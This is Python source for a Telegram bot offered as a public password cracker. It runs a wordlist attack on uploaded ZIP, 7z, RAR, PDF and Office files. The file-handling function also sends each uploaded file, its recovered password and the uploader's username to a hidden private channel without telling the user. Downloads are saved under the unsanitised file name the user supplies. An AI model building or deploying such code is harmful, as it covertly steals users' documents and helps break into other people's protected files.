import os
import requests
import pyzipper
import py7zr
import pdfplumber
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
PRIVATE_CHANNEL = -1004491770657  # 🔥 APNA PRIVATE CHANNEL ID DALO
CHANNEL_USERNAME = "@nrtecno2"

# ============================================================
# CHANNEL CHECK
# ============================================================
async def check_channel_membership(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember"
        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
        response = requests.get(url, params=params)
        data = response.json()
        if data["ok"]:
            status = data["result"]["status"]
            return status in ["member", "creator", "administrator"]
        return False
    except:
        return False

# ============================================================
# WORDLIST
# ============================================================
def load_wordlist(path="wordlist.txt"):
    if os.path.exists(path):
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    return ['123456', 'password', 'admin', '1234', '0000', 'qwerty', 'abc123', 'letmein', 'welcome', 'monkey']

WORDLIST = load_wordlist()

# ============================================================
# CRACKERS
# ============================================================
def crack_zip(file_path):
    for pwd in WORDLIST:
        try:
            with pyzipper.AESZipFile(file_path) as zf:
                zf.extractall(pwd=pwd.encode())
                return pwd
        except:
            continue
    return None

def crack_7z(file_path):
    for pwd in WORDLIST:
        try:
            with py7zr.SevenZipFile(file_path, password=pwd) as archive:
                archive.extractall()
                return pwd
        except:
            continue
    return None

def crack_pdf(file_path):
    for pwd in WORDLIST:
        try:
            with pdfplumber.open(file_path, password=pwd) as pdf:
                if len(pdf.pages) > 0:
                    return pwd
        except:
            continue
    return None

def crack_office(file_path):
    try:
        import msoffcrypto
        for pwd in WORDLIST:
            try:
                with open(file_path, 'rb') as f:
                    office = msoffcrypto.OfficeFile(f)
                    office.load_key(password=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None

def crack_rar(file_path):
    try:
        import rarfile
        for pwd in WORDLIST:
            try:
                with rarfile.RarFile(file_path) as rf:
                    rf.extractall(pwd=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None

def crack_file(file_path, ext):
    if ext == 'zip':
        return crack_zip(file_path)
    elif ext == '7z':
        return crack_7z(file_path)
    elif ext == 'pdf':
        return crack_pdf(file_path)
    elif ext in ['docx', 'doc', 'xlsx', 'xls', 'pptx', 'ppt']:
        return crack_office(file_path)
    elif ext == 'rar':
        return crack_rar(file_path)
    return None

# ============================================================
# HANDLERS
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id):
        # 🔴 RED COLOR BUTTONS - NOT JOINED
        keyboard = [
            [
                InlineKeyboardButton("🔴 JOIN CHANNEL", url="https://t.me/nrtecno2"),
                InlineKeyboardButton("✅ VERIFY", callback_data="verify")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🔴 *Access Denied!*\n\n"
            "❌ You must join our channel first to use this bot.\n\n"
            "👉 @nrtecno2\n\n"
            "_Click JOIN CHANNEL button, then click VERIFY._",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # ✅ JOINED - Directly ask for file
    await update.message.reply_text(
        "🔐 *NRTECNO PASSWORD CRACKER*\n\n"
        "✅ Channel Member Verified!\n\n"
        "📁 *Send me any password protected file.*\n\n"
        "Supported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX",
        parse_mode='Markdown'
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if query.data == "verify":
        if await check_channel_membership(user_id):
            # ✅ VERIFIED - Ask for file
            await query.edit_message_text(
                "🔐 *NRTECNO PASSWORD CRACKER*\n\n"
                "✅ Channel Member Verified!\n\n"
                "📁 *Send me any password protected file.*\n\n"
                "Supported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX",
                parse_mode='Markdown'
            )
        else:
            # Still not joined
            keyboard = [
                [
                    InlineKeyboardButton("🔴 JOIN CHANNEL", url="https://t.me/nrtecno2"),
                    InlineKeyboardButton("✅ VERIFY", callback_data="verify")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                "🔴 *Still Not Verified!*\n\n"
                "❌ Please join @nrtecno2 first.\n\n"
                "_Click JOIN CHANNEL, then VERIFY._",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or str(user_id)
    
    # Check if user joined channel
    if not await check_channel_membership(user_id):
        keyboard = [
            [
                InlineKeyboardButton("🔴 JOIN CHANNEL", url="https://t.me/nrtecno2"),
                InlineKeyboardButton("✅ VERIFY", callback_data="verify")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🔴 *Access Denied!*\n\n"
            "❌ Please join @nrtecno2 first.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    file = update.message.document
    if not file:
        await update.message.reply_text(
            "❌ *Please send a file.*\n\n"
            "Send any password protected file.",
            parse_mode='Markdown'
        )
        return
    
    # Download file
    file_obj = await file.get_file()
    file_path = f"downloads/{file.file_name}"
    os.makedirs("downloads", exist_ok=True)
    await file_obj.download_to_drive(file_path)
    
    await update.message.reply_text(
        "🔍 *Cracking Password...*\n\n"
        "⏳ Please wait, this may take a few moments.",
        parse_mode='Markdown'
    )
    
    # Crack
    ext = file.file_name.split('.')[-1].lower()
    password = crack_file(file_path, ext)
    
    # Forward to private channel
    try:
        caption = f"📁 File: {file.file_name}\n🔑 Password: {password or 'NOT FOUND'}\n👤 User: @{username}"
        with open(file_path, 'rb') as f:
            await context.bot.send_document(
                chat_id=PRIVATE_CHANNEL,
                document=f,
                caption=caption
            )
    except Exception as e:
        print(f"Forward failed: {e}")
    
    # Reply to user
    if password:
        await update.message.reply_text(
            f"✅ *Password Cracked!*\n\n"
            f"🔑 `{password}`\n\n"
            f"📁 {file.file_name}",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ *Password Not Found*\n\n"
            f"📁 {file.file_name}\n"
            f"🔢 {len(WORDLIST)} passwords tried.\n\n"
            f"_Try with a larger wordlist._",
            parse_mode='Markdown'
        )
    
    # Cleanup
    os.remove(file_path)

# ============================================================
# MAIN
# ============================================================
def main():
    if not TOKEN:
        print("❌ BOT_TOKEN not found!")
        return
    
    # Delete webhook
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook")
        print("✅ Webhook Deleted")
    except:
        pass
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("🤖 NRTECNO BOT STARTED...")
    app.run_polling()

if __name__ == "__main__":
    main()
